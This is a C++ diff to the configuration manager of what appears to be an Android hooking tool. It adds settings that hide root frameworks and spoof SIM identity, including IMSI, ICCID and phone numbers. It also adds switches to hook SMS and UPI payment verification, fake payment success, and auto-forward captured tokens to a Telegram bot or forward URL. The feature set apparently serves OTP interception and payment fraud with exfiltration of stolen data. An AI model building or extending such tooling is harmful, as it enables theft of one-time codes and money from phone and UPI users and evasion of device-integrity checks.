@@ -189,6 +189,20 @@ int parse_int(const std::string& json, const std::string& key, int default_value
 
 }  // namespace
 
+static std::string json_escape_cfg(const std::string& input) {
+    std::string out;
+    out.reserve(input.size() + 8);
+    for (char c : input) {
+        switch (c) {
+            case '"': out += "\\\""; break;
+            case '\\': out += "\\\\"; break;
+            case '\n': out += "\\n"; break;
+            default: out += c; break;
+        }
+    }
+    return out;
+}
+
 ConfigManager& ConfigManager::instance() {
     static ConfigManager manager;
     return manager;
@@ -285,15 +299,36 @@ void ConfigManager::persist_runtime() {
     out << "{\n"
         << "  \"hide_root\": " << (c.hide_root ? "true" : "false") << ",\n"
         << "  \"hide_developer\": " << (c.hide_developer ? "true" : "false") << ",\n"
+        << "  \"hide_magisk\": " << (c.hide_magisk ? "true" : "false") << ",\n"
+        << "  \"hide_kernelsu\": " << (c.hide_kernelsu ? "true" : "false") << ",\n"
+        << "  \"hide_apatch\": " << (c.hide_apatch ? "true" : "false") << ",\n"
+        << "  \"hide_sukisu\": " << (c.hide_sukisu ? "true" : "false") << ",\n"
+        << "  \"hide_all_root_apps\": " << (c.hide_all_root_apps ? "true" : "false") << ",\n"
+        << "  \"enable_virtual_sim\": " << (c.virtual_sim_active() ? "true" : "false") << ",\n"
+        << "  \"enable_sim1_mock\": " << (c.enable_sim1_mock ? "true" : "false") << ",\n"
+        << "  \"enable_sim2_mock\": " << (c.enable_sim2_mock ? "true" : "false") << ",\n"
+        << "  \"enable_phone_spoof\": " << (c.enable_phone_spoof ? "true" : "false") << ",\n"
+        << "  \"mock_country_iso\": \"" << json_escape_cfg(c.mock_country_iso) << "\",\n"
+        << "  \"mock_phone_sim1\": \"" << json_escape_cfg(c.mock_phone_sim1) << "\",\n"
+        << "  \"mock_phone_sim2\": \"" << json_escape_cfg(c.mock_phone_sim2) << "\",\n"
+        << "  \"mock_operator_name_sim1\": \"" << json_escape_cfg(c.mock_operator_name_sim1) << "\",\n"
+        << "  \"mock_operator_name_sim2\": \"" << json_escape_cfg(c.mock_operator_name_sim2) << "\",\n"
+        << "  \"mock_operator_numeric_sim1\": \"" << json_escape_cfg(c.mock_operator_numeric_sim1) << "\",\n"
+        << "  \"mock_operator_numeric_sim2\": \"" << json_escape_cfg(c.mock_operator_numeric_sim2) << "\",\n"
+        << "  \"mock_imsi_sim1\": \"" << json_escape_cfg(c.mock_imsi_sim1) << "\",\n"
+        << "  \"mock_imsi_sim2\": \"" << json_escape_cfg(c.mock_imsi_sim2) << "\",\n"
+        << "  \"mock_iccid_sim1\": \"" << json_escape_cfg(c.mock_iccid_sim1) << "\",\n"
+        << "  \"mock_iccid_sim2\": \"" << json_escape_cfg(c.mock_iccid_sim2) << "\",\n"
         << "  \"hook_incoming_sms\": " << (c.hook_incoming_sms ? "true" : "false") << ",\n"
         << "  \"hook_outgoing_sms\": " << (c.hook_outgoing_sms ? "true" : "false") << ",\n"
+        << "  \"hook_upi_verification\": " << (c.hook_upi_verification ? "true" : "false") << ",\n"
         << "  \"auto_hook_foreground\": " << (c.auto_hook_foreground ? "true" : "false") << ",\n"
         << "  \"intercept_fake_success\": " << (c.intercept_fake_success ? "true" : "false") << ",\n"
         << "  \"auto_forward_token\": " << (c.auto_forward_token ? "true" : "false") << ",\n"
-        << "  \"telegram_bot_token\": \"" << c.telegram_bot_token << "\",\n"
-        << "  \"telegram_chat_id\": \"" << c.telegram_chat_id << "\",\n"
-        << "  \"forward_url\": \"" << c.forward_url << "\",\n"
-        << "  \"log_file\": \"" << c.log_file << "\"\n"
+        << "  \"telegram_bot_token\": \"" << json_escape_cfg(c.telegram_bot_token) << "\",\n"
+        << "  \"telegram_chat_id\": \"" << json_escape_cfg(c.telegram_chat_id) << "\",\n"
+        << "  \"forward_url\": \"" << json_escape_cfg(c.forward_url) << "\",\n"
+        << "  \"log_file\": \"" << json_escape_cfg(c.log_file) << "\"\n"
         << "}\n";
     chmod(path.c_str(), 0644);
 }
